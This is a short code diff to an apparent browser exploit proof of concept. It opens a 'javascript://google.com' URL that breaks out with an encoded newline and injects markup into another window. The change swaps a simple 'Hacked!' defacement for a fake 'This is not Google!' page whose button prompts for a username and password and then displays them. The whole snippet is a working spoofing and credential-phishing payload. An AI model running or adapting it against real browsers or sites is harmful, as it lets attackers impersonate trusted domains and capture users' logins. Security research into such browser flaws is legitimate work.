@@ -3,7 +3,14 @@ function a(){
 	window.open("abcd://google.com", "x");
 	//menggunakan scheme abcd://
 	setTimeout(function(){
-		window.open("javascript://google.com/search?q=google.com&source=/%0adocument.body.innerHTML='%3ch1%20style=color:red%3eHacked!'", "x");
+		window.open("javascript://google.com/search?q=google.com&source=/%0adocument.body.innerHTML='`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `'", "x");
 	}, 111);
 }
 </script> 
